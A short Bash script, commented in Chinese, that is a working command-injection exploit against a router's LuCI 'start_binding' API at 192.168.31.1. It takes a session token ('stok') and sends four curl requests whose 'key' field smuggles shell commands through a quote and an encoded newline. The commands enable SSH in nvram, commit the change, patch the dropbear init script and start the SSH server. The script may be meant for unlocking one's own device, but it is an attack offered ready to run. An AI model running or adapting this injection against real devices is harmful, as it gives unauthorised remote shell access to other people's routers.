#!/bin/bash

# 检查是否提供了 stok 参数
if [ -z "$1" ]; then
  echo "Usage: $0 <stok>"
  exit 1
fi

# 将第一个参数赋值给 stok
stok="$1"

# 执行 curl 命令
curl -X POST "http://192.168.31.1/cgi-bin/luci/;stok=$stok/api/xqsystem/start_binding" -d "uid=1234&key=1234'%0Anvram%20set%20ssh_en%3D1'"
curl -X POST "http://192.168.31.1/cgi-bin/luci/;stok=$stok/api/xqsystem/start_binding" -d "uid=1234&key=1234'%0Anvram%20commit'"
curl -X POST "http://192.168.31.1/cgi-bin/luci/;stok=$stok/api/xqsystem/start_binding" -d "uid=1234&key=1234'%0Ased%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%22debug%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear'"
curl -X POST "http://192.168.31.1/cgi-bin/luci/;stok=$stok/api/xqsystem/start_binding" -d "uid=1234&key=1234'%0A%2Fetc%2Finit.d%2Fdropbear%20start'"
